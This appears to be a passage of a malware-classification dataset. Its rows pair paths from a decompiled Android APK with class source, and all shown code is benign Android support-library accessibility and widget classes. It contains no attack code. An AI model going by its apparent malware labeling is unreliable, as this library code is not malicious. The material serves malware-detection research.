@Override public int getCurrentItemIndex(    Object record){       return 0;     }     @Override public int getFromIndex(    Object record){       return 0;     }     @Override public int getItemCount(    Object record){       return 0;     }     @Override public int getMaxScrollX(    Object record){       return 0;     }     @Override public int getMaxScrollY(    Object record){       return 0;     }     @Override public Parcelable getParcelableData(    Object record){       return null;     }     @Override public int getRemovedCount(    Object record){       return 0;     }     @Override public int getScrollX(    Object record){       return 0;     }     @Override public int getScrollY(    Object record){       return 0;     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return null;     }     @Override public List<CharSequence> getText(    Object record){       return Collections.emptyList();     }     @Override public int getToIndex(    Object record){       return 0;     }     @Override public int getWindowId(    Object record){       return 0;     }     @Override public boolean isChecked(    Object record){       return false;     }     @Override public boolean isEnabled(    Object record){       return false;     }     @Override public boolean isFullScreen(    Object record){       return false;     }     @Override public boolean isPassword(    Object record){       return false;     }     @Override public boolean isScrollable(    Object record){       return false;     }     @Override public void recycle(    Object record){     }     @Override public void setAddedCount(    Object record,    int addedCount){     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){     }     @Override public void setChecked(    Object record,    boolean isChecked){     }     @Override public void setClassName(    Object record,    CharSequence className){     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){     }     @Override public void setEnabled(    Object record,    boolean isEnabled){     }     @Override public void setFromIndex(    Object record,    int fromIndex){     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){     }     @Override public void setItemCount(    Object record,    int itemCount){     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){     }     @Override public void setPassword(    Object record,    boolean isPassword){     }     @Override public void setRemovedCount(    Object record,    int removedCount){     }     @Override public void setScrollX(    Object record,    int scrollX){     }     @Override public void setScrollY(    Object record,    int scrollY){     }     @Override public void setScrollable(    Object record,    boolean scrollable){     }     @Override public void setSource(    Object record,    View source){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){     }     @Override public void setToIndex(    Object record,    int toIndex){     }   } static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {     AccessibilityRecordIcsImpl(){     }     @Override public Object obtain(){       return AccessibilityRecordCompatIcs.obtain();     }     @Override public Object obtain(    Object record){       return AccessibilityRecordCompatIcs.obtain(record);     }     @Override public int getAddedCount(    Object record){       return AccessibilityRecordCompatIcs.getAddedCount(record);     }     @Override public CharSequence getBeforeText(    Object record){       return AccessibilityRecordCompatIcs.getBeforeText(record);     }     @Override public CharSequence getClassName(    Object record){       return AccessibilityRecordCompatIcs.getClassName(record);     }     @Override public CharSequence getContentDescription(    Object record){       return AccessibilityRecordCompatIcs.getContentDescription(record);     }     @Override public int getCurrentItemIndex(    Object record){       return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);     }     @Override public int getFromIndex(    Object record){       return AccessibilityRecordCompatIcs.getFromIndex(record);     }     @Override public int getItemCount(    Object record){       return AccessibilityRecordCompatIcs.getItemCount(record);     }     @Override public Parcelable getParcelableData(    Object record){       return AccessibilityRecordCompatIcs.getParcelableData(record);     }     @Override public int getRemovedCount(    Object record){       return AccessibilityRecordCompatIcs.getRemovedCount(record);     }     @Override public int getScrollX(    Object record){       return AccessibilityRecordCompatIcs.getScrollX(record);     }     @Override public int getScrollY(    Object record){       return AccessibilityRecordCompatIcs.getScrollY(record);     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));     }     @Override public List<CharSequence> getText(    Object record){       return AccessibilityRecordCompatIcs.getText(record);     }     @Override public int getToIndex(    Object record){       return AccessibilityRecordCompatIcs.getToIndex(record);     }     @Override public int getWindowId(    Object record){       return AccessibilityRecordCompatIcs.getWindowId(record);     }     @Override public boolean isChecked(    Object record){       return AccessibilityRecordCompatIcs.isChecked(record);     }     @Override public boolean isEnabled(    Object record){       return AccessibilityRecordCompatIcs.isEnabled(record);     }     @Override public boolean isFullScreen(    Object record){       return AccessibilityRecordCompatIcs.isFullScreen(record);     }     @Override public boolean isPassword(    Object record){       return AccessibilityRecordCompatIcs.isPassword(record);     }     @Override public boolean isScrollable(    Object record){       return AccessibilityRecordCompatIcs.isScrollable(record);     }     @Override public void recycle(    Object record){       AccessibilityRecordCompatIcs.recycle(record);     }     @Override public void setAddedCount(    Object record,    int addedCount){       AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){       AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);     }     @Override public void setChecked(    Object record,    boolean isChecked){       AccessibilityRecordCompatIcs.setChecked(record,isChecked);     }     @Override public void setClassName(    Object record,    CharSequence className){       AccessibilityRecordCompatIcs.setClassName(record,className);     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){       AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){       AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);     }     @Override public void setEnabled(    Object record,    boolean isEnabled){       AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);     }     @Override public void setFromIndex(    Object record,    int fromIndex){       AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){       AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);     }     @Override public void setItemCount(    Object record,    int itemCount){       AccessibilityRecordCompatIcs.setItemCount(record,itemCount);     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){       AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);     }     @Override public void setPassword(    Object record,    boolean isPassword){       AccessibilityRecordCompatIcs.setPassword(record,isPassword);     }     @Override public void setRemovedCount(    Object record,    int removedCount){       AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);     }     @Override public void setScrollX(    Object record,    int scrollX){       AccessibilityRecordCompatIcs.setScrollX(record,scrollX);     }     @Override public void setScrollY(    Object record,    int scrollY){       AccessibilityRecordCompatIcs.setScrollY(record,scrollY);     }     @Override public void setScrollable(    Object record,    boolean scrollable){       AccessibilityRecordCompatIcs.setScrollable(record,scrollable);     }     @Override public void setSource(    Object record,    View source){       AccessibilityRecordCompatIcs.setSource(record,source);     }     @Override public void setToIndex(    Object record,    int toIndex){       AccessibilityRecordCompatIcs.setToIndex(record,toIndex);     }   } static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {     AccessibilityRecordIcsMr1Impl(){     }     @Override public int getMaxScrollX(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);     }     @Override public int getMaxScrollY(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){       AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){       AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);     }   } static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {     AccessibilityRecordJellyBeanImpl(){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){       AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityRecordJellyBeanImpl();       return;     }     if (Build.VERSION.SDK_INT >= 15) {       IMPL=new AccessibilityRecordIcsMr1Impl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityRecordIcsImpl();     }  else {       IMPL=new AccessibilityRecordStubImpl();     }   }   public AccessibilityRecordCompat(  Object record){     this.mRecord=record;   }   public Object getImpl(){     return this.mRecord;   }   public static AccessibilityRecordCompat obtain(  AccessibilityRecordCompat record){     return new AccessibilityRecordCompat(IMPL.obtain(record.mRecord));   }   public static AccessibilityRecordCompat obtain(){     return new AccessibilityRecordCompat(IMPL.obtain());   }   public void setSource(  View source){     IMPL.setSource(this.mRecord,source);   }   public void setSource(  View root,  int virtualDescendantId){     IMPL.setSource(this.mRecord,root,virtualDescendantId);   }   public AccessibilityNodeInfoCompat getSource(){     return IMPL.getSource(this.mRecord);   }   public int getWindowId(){     return IMPL.getWindowId(this.mRecord);   }   public boolean isChecked(){     return IMPL.isChecked(this.mRecord);   }   public void setChecked(  boolean isChecked){     IMPL.setChecked(this.mRecord,isChecked);   }   public boolean isEnabled(){     return IMPL.isEnabled(this.mRecord);   }   public void setEnabled(  boolean isEnabled){     IMPL.setEnabled(this.mRecord,isEnabled);   }   public boolean isPassword(){     return IMPL.isPassword(this.mRecord);   }   public void setPassword(  boolean isPassword){     IMPL.setPassword(this.mRecord,isPassword);   }   public boolean isFullScreen(){     return IMPL.isFullScreen(this.mRecord);   }   public void setFullScreen(  boolean isFullScreen){     IMPL.setFullScreen(this.mRecord,isFullScreen);   }   public boolean isScrollable(){     return IMPL.isScrollable(this.mRecord);   }   public void setScrollable(  boolean scrollable){     IMPL.setScrollable(this.mRecord,scrollable);   }   public int getItemCount(){     return IMPL.getItemCount(this.mRecord);   }   public void setItemCount(  int itemCount){     IMPL.setItemCount(this.mRecord,itemCount);   }   public int getCurrentItemIndex(){     return IMPL.getCurrentItemIndex(this.mRecord);   }   public void setCurrentItemIndex(  int currentItemIndex){     IMPL.setCurrentItemIndex(this.mRecord,currentItemIndex);   }   public int getFromIndex(){     return IMPL.getFromIndex(this.mRecord);   }   public void setFromIndex(  int fromIndex){     IMPL.setFromIndex(this.mRecord,fromIndex);   }   public int getToIndex(){     return IMPL.getToIndex(this.mRecord);   }   public void setToIndex(  int toIndex){     IMPL.setToIndex(this.mRecord,toIndex);   }   public int getScrollX(){     return IMPL.getScrollX(this.mRecord);   }   public void setScrollX(  int scrollX){     IMPL.setScrollX(this.mRecord,scrollX);   }   public int getScrollY(){     return IMPL.getScrollY(this.mRecord);   }   public void setScrollY(  int scrollY){     IMPL.setScrollY(this.mRecord,scrollY);   }   public int getMaxScrollX(){     return IMPL.getMaxScrollX(this.mRecord);   }   public void setMaxScrollX(  int maxScrollX){     IMPL.setMaxScrollX(this.mRecord,maxScrollX);   }   public int getMaxScrollY(){     return IMPL.getMaxScrollY(this.mRecord);   }   public void setMaxScrollY(  int maxScrollY){     IMPL.setMaxScrollY(this.mRecord,maxScrollY);   }   public int getAddedCount(){     return IMPL.getAddedCount(this.mRecord);   }   public void setAddedCount(  int addedCount){     IMPL.setAddedCount(this.mRecord,addedCount);   }   public int getRemovedCount(){     return IMPL.getRemovedCount(this.mRecord);   }   public void setRemovedCount(  int removedCount){     IMPL.setRemovedCount(this.mRecord,removedCount);   }   public CharSequence getClassName(){     return IMPL.getClassName(this.mRecord);   }   public void setClassName(  CharSequence className){     IMPL.setClassName(this.mRecord,className);   }   public List<CharSequence> getText(){     return IMPL.getText(this.mRecord);   }   public CharSequence getBeforeText(){     return IMPL.getBeforeText(this.mRecord);   }   public void setBeforeText(  CharSequence beforeText){     IMPL.setBeforeText(this.mRecord,beforeText);   }   public CharSequence getContentDescription(){     return IMPL.getContentDescription(this.mRecord);   }   public void setContentDescription(  CharSequence contentDescription){     IMPL.setContentDescription(this.mRecord,contentDescription);   }   public Parcelable getParcelableData(){     return IMPL.getParcelableData(this.mRecord);   }   public void setParcelableData(  Parcelable parcelableData){     IMPL.setParcelableData(this.mRecord,parcelableData);   }   public void recycle(){     IMPL.recycle(this.mRecord);   }   public int hashCode(){     if (this.mRecord == null) {       return 0;     }     return this.mRecord.hashCode();   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (obj != null && getClass() == obj.getClass()) {       AccessibilityRecordCompat other=(AccessibilityRecordCompat)obj;       return this.mRecord == null ? other.mRecord == null : this.mRecord.equals(other.mRecord);     }     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityRecordCompatIcs.code","class AccessibilityRecordCompatIcs {   AccessibilityRecordCompatIcs(){   }   public static Object obtain(){     return AccessibilityRecord.obtain();   }   public static Object obtain(  Object record){     return AccessibilityRecord.obtain((AccessibilityRecord)record);   }   public static int getAddedCount(  Object record){     return ((AccessibilityRecord)record).getAddedCount();   }   public static CharSequence getBeforeText(  Object record){     return ((AccessibilityRecord)record).getBeforeText();   }   public static CharSequence getClassName(  Object record){     return ((AccessibilityRecord)record).getClassName();   }   public static CharSequence getContentDescription(  Object record){     return ((AccessibilityRecord)record).getContentDescription();   }   public static int getCurrentItemIndex(  Object record){     return ((AccessibilityRecord)record).getCurrentItemIndex();   }   public static int getFromIndex(  Object record){     return ((AccessibilityRecord)record).getFromIndex();   }   public static int getItemCount(  Object record){     return ((AccessibilityRecord)record).getItemCount();   }   public static Parcelable getParcelableData(  Object record){     return ((AccessibilityRecord)record).getParcelableData();   }   public static int getRemovedCount(  Object record){     return ((AccessibilityRecord)record).getRemovedCount();   }   public static int getScrollX(  Object record){     return ((AccessibilityRecord)record).getScrollX();   }   public static int getScrollY(  Object record){     return ((AccessibilityRecord)record).getScrollY();   }   public static Object getSource(  Object record){     return ((AccessibilityRecord)record).getSource();   }   public static List<CharSequence> getText(  Object record){     return ((AccessibilityRecord)record).getText();   }   public static int getToIndex(  Object record){     return ((AccessibilityRecord)record).getToIndex();   }   public static int getWindowId(  Object record){     return ((AccessibilityRecord)record).getWindowId();   }   public static boolean isChecked(  Object record){     return ((AccessibilityRecord)record).isChecked();   }   public static boolean isEnabled(  Object record){     return ((AccessibilityRecord)record).isEnabled();   }   public static boolean isFullScreen(  Object record){     return ((AccessibilityRecord)record).isFullScreen();   }   public static boolean isPassword(  Object record){     return ((AccessibilityRecord)record).isPassword();   }   public static boolean isScrollable(  Object record){     return ((AccessibilityRecord)record).isScrollable();   }   public static void recycle(  Object record){     ((AccessibilityRecord)record).recycle();   }   public static void setAddedCount(  Object record,  int addedCount){     ((AccessibilityRecord)record).setAddedCount(addedCount);   }   public static void setBeforeText(  Object record,  CharSequence beforeText){     ((AccessibilityRecord)record).setBeforeText(beforeText);   }   public static void setChecked(  Object record,  boolean isChecked){     ((AccessibilityRecord)record).setChecked(isChecked);   }   public static void setClassName(  Object record,  CharSequence className){     ((AccessibilityRecord)record).setClassName(className);   }   public static void setContentDescription(  Object record,  CharSequence contentDescription){     ((AccessibilityRecord)record).setContentDescription(contentDescription);   }   public static void setCurrentItemIndex(  Object record,  int currentItemIndex){     ((AccessibilityRecord)record).setCurrentItemIndex(currentItemIndex);   }   public static void setEnabled(  Object record,  boolean isEnabled){     ((AccessibilityRecord)record).setEnabled(isEnabled);   }   public static void setFromIndex(  Object record,  int fromIndex){     ((AccessibilityRecord)record).setFromIndex(fromIndex);   }   public static void setFullScreen(  Object record,  boolean isFullScreen){     ((AccessibilityRecord)record).setFullScreen(isFullScreen);   }   public static void setItemCount(  Object record,  int itemCount){     ((AccessibilityRecord)record).setItemCount(itemCount);   }   public static void setParcelableData(  Object record,  Parcelable parcelableData){     ((AccessibilityRecord)record).setParcelableData(parcelableData);   }   public static void setPassword(  Object record,  boolean isPassword){     ((AccessibilityRecord)record).setPassword(isPassword);   }   public static void setRemovedCount(  Object record,  int removedCount){     ((AccessibilityRecord)record).setRemovedCount(removedCount);   }   public static void setScrollX(  Object record,  int scrollX){     ((AccessibilityRecord)record).setScrollX(scrollX);   }   public static void setScrollY(  Object record,  int scrollY){     ((AccessibilityRecord)record).setScrollY(scrollY);   }   public static void setScrollable(  Object record,  boolean scrollable){     ((AccessibilityRecord)record).setScrollable(scrollable);   }   public static void setSource(  Object record,  View source){     ((AccessibilityRecord)record).setSource(source);   }   public static void setToIndex(  Object record,  int toIndex){     ((AccessibilityRecord)record).setToIndex(toIndex);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityRecordCompatIcsMr1.code","class AccessibilityRecordCompatIcsMr1 {   AccessibilityRecordCompatIcsMr1(){   }   public static int getMaxScrollX(  Object record){     return ((AccessibilityRecord)record).getMaxScrollX();   }   public static int getMaxScrollY(  Object record){     return ((AccessibilityRecord)record).getMaxScrollY();   }   public static void setMaxScrollX(  Object record,  int maxScrollX){     ((AccessibilityRecord)record).setMaxScrollX(maxScrollX);   }   public static void setMaxScrollY(  Object record,  int maxScrollY){     ((AccessibilityRecord)record).setMaxScrollY(maxScrollY);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityRecordCompatJellyBean.code","class AccessibilityRecordCompatJellyBean {   AccessibilityRecordCompatJellyBean(){   }   public static void setSource(  Object record,  View root,  int virtualDescendantId){     ((AccessibilityRecord)record).setSource(root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityRecordIcsImpl.code","static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {   AccessibilityRecordIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityRecordCompatIcs.obtain();   }   @Override public Object obtain(  Object record){     return AccessibilityRecordCompatIcs.obtain(record);   }   @Override public int getAddedCount(  Object record){     return AccessibilityRecordCompatIcs.getAddedCount(record);   }   @Override public CharSequence getBeforeText(  Object record){     return AccessibilityRecordCompatIcs.getBeforeText(record);   }   @Override public CharSequence getClassName(  Object record){     return AccessibilityRecordCompatIcs.getClassName(record);   }   @Override public CharSequence getContentDescription(  Object record){     return AccessibilityRecordCompatIcs.getContentDescription(record);   }   @Override public int getCurrentItemIndex(  Object record){     return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);   }   @Override public int getFromIndex(  Object record){     return AccessibilityRecordCompatIcs.getFromIndex(record);   }   @Override public int getItemCount(  Object record){     return AccessibilityRecordCompatIcs.getItemCount(record);   }   @Override public Parcelable getParcelableData(  Object record){     return AccessibilityRecordCompatIcs.getParcelableData(record);   }   @Override public int getRemovedCount(  Object record){     return AccessibilityRecordCompatIcs.getRemovedCount(record);   }   @Override public int getScrollX(  Object record){     return AccessibilityRecordCompatIcs.getScrollX(record);   }   @Override public int getScrollY(  Object record){     return AccessibilityRecordCompatIcs.getScrollY(record);   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));   }   @Override public List<CharSequence> getText(  Object record){     return AccessibilityRecordCompatIcs.getText(record);   }   @Override public int getToIndex(  Object record){     return AccessibilityRecordCompatIcs.getToIndex(record);   }   @Override public int getWindowId(  Object record){     return AccessibilityRecordCompatIcs.getWindowId(record);   }   @Override public boolean isChecked(  Object record){     return AccessibilityRecordCompatIcs.isChecked(record);   }   @Override public boolean isEnabled(  Object record){     return AccessibilityRecordCompatIcs.isEnabled(record);   }   @Override public boolean isFullScreen(  Object record){     return AccessibilityRecordCompatIcs.isFullScreen(record);   }   @Override public boolean isPassword(  Object record){     return AccessibilityRecordCompatIcs.isPassword(record);   }   @Override public boolean isScrollable(  Object record){     return AccessibilityRecordCompatIcs.isScrollable(record);   }   @Override public void recycle(  Object record){     AccessibilityRecordCompatIcs.recycle(record);   }   @Override public void setAddedCount(  Object record,  int addedCount){     AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){     AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);   }   @Override public void setChecked(  Object record,  boolean isChecked){     AccessibilityRecordCompatIcs.setChecked(record,isChecked);   }   @Override public void setClassName(  Object record,  CharSequence className){     AccessibilityRecordCompatIcs.setClassName(record,className);   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){     AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){     AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);   }   @Override public void setEnabled(  Object record,  boolean isEnabled){     AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);   }   @Override public void setFromIndex(  Object record,  int fromIndex){     AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){     AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);   }   @Override public void setItemCount(  Object record,  int itemCount){     AccessibilityRecordCompatIcs.setItemCount(record,itemCount);   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){     AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);   }   @Override public void setPassword(  Object record,  boolean isPassword){     AccessibilityRecordCompatIcs.setPassword(record,isPassword);   }   @Override public void setRemovedCount(  Object record,  int removedCount){     AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);   }   @Override public void setScrollX(  Object record,  int scrollX){     AccessibilityRecordCompatIcs.setScrollX(record,scrollX);   }   @Override public void setScrollY(  Object record,  int scrollY){     AccessibilityRecordCompatIcs.setScrollY(record,scrollY);   }   @Override public void setScrollable(  Object record,  boolean scrollable){     AccessibilityRecordCompatIcs.setScrollable(record,scrollable);   }   @Override public void setSource(  Object record,  View source){     AccessibilityRecordCompatIcs.setSource(record,source);   }   @Override public void setToIndex(  Object record,  int toIndex){     AccessibilityRecordCompatIcs.setToIndex(record,toIndex);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityRecordIcsMr1Impl.code","static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {   AccessibilityRecordIcsMr1Impl(){   }   @Override public int getMaxScrollX(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);   }   @Override public int getMaxScrollY(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){     AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){     AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityRecordImpl.code","interface AccessibilityRecordImpl {   int getAddedCount(  Object obj);   CharSequence getBeforeText(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getCurrentItemIndex(  Object obj);   int getFromIndex(  Object obj);   int getItemCount(  Object obj);   int getMaxScrollX(  Object obj);   int getMaxScrollY(  Object obj);   Parcelable getParcelableData(  Object obj);   int getRemovedCount(  Object obj);   int getScrollX(  Object obj);   int getScrollY(  Object obj);   AccessibilityNodeInfoCompat getSource(  Object obj);   List<CharSequence> getText(  Object obj);   int getToIndex(  Object obj);   int getWindowId(  Object obj);   boolean isChecked(  Object obj);   boolean isEnabled(  Object obj);   boolean isFullScreen(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   Object obtain();   Object obtain(  Object obj);   void recycle(  Object obj);   void setAddedCount(  Object obj,  int i);   void setBeforeText(  Object obj,  CharSequence charSequence);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setCurrentItemIndex(  Object obj,  int i);   void setEnabled(  Object obj,  boolean z);   void setFromIndex(  Object obj,  int i);   void setFullScreen(  Object obj,  boolean z);   void setItemCount(  Object obj,  int i);   void setMaxScrollX(  Object obj,  int i);   void setMaxScrollY(  Object obj,  int i);   void setParcelableData(  Object obj,  Parcelable parcelable);   void setPassword(  Object obj,  boolean z);   void setRemovedCount(  Object obj,  int i);   void setScrollX(  Object obj,  int i);   void setScrollY(  Object obj,  int i);   void setScrollable(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setToIndex(  Object obj,  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityRecordJellyBeanImpl.code","static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {   AccessibilityRecordJellyBeanImpl(){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){     AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityRecordStubImpl.code","static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {   AccessibilityRecordStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  Object record){     return null;   }   @Override public int getAddedCount(  Object record){     return 0;   }   @Override public CharSequence getBeforeText(  Object record){     return null;   }   @Override public CharSequence getClassName(  Object record){     return null;   }   @Override public CharSequence getContentDescription(  Object record){     return null;   }   @Override public int getCurrentItemIndex(  Object record){     return 0;   }   @Override public int getFromIndex(  Object record){     return 0;   }   @Override public int getItemCount(  Object record){     return 0;   }   @Override public int getMaxScrollX(  Object record){     return 0;   }   @Override public int getMaxScrollY(  Object record){     return 0;   }   @Override public Parcelable getParcelableData(  Object record){     return null;   }   @Override public int getRemovedCount(  Object record){     return 0;   }   @Override public int getScrollX(  Object record){     return 0;   }   @Override public int getScrollY(  Object record){     return 0;   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return null;   }   @Override public List<CharSequence> getText(  Object record){     return Collections.emptyList();   }   @Override public int getToIndex(  Object record){     return 0;   }   @Override public int getWindowId(  Object record){     return 0;   }   @Override public boolean isChecked(  Object record){     return false;   }   @Override public boolean isEnabled(  Object record){     return false;   }   @Override public boolean isFullScreen(  Object record){     return false;   }   @Override public boolean isPassword(  Object record){     return false;   }   @Override public boolean isScrollable(  Object record){     return false;   }   @Override public void recycle(  Object record){   }   @Override public void setAddedCount(  Object record,  int addedCount){   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){   }   @Override public void setChecked(  Object record,  boolean isChecked){   }   @Override public void setClassName(  Object record,  CharSequence className){   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){   }   @Override public void setEnabled(  Object record,  boolean isEnabled){   }   @Override public void setFromIndex(  Object record,  int fromIndex){   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){   }   @Override public void setItemCount(  Object record,  int itemCount){   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){   }   @Override public void setPassword(  Object record,  boolean isPassword){   }   @Override public void setRemovedCount(  Object record,  int removedCount){   }   @Override public void setScrollX(  Object record,  int scrollX){   }   @Override public void setScrollY(  Object record,  int scrollY){   }   @Override public void setScrollable(  Object record,  boolean scrollable){   }   @Override public void setSource(  Object record,  View source){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){   }   @Override public void setToIndex(  Object record,  int toIndex){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityStateChangeListenerBridge.code","interface AccessibilityStateChangeListenerBridge {   void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityStateChangeListenerCompat.code","public static abstract class AccessibilityStateChangeListenerCompat {   final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);   public abstract void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\BaseEdgeEffectImpl.code","static class BaseEdgeEffectImpl implements EdgeEffectImpl {   BaseEdgeEffectImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return null;   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){   }   @Override public boolean isFinished(  Object edgeEffect){     return true;   }   @Override public void finish(  Object edgeEffect){   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return false;   }   @Override public boolean onRelease(  Object edgeEffect){     return false;   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return false;   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\ChangeObserver.code","public class ChangeObserver extends ContentObserver {   public ChangeObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     CursorAdapter.this.onContentChanged();   } } "
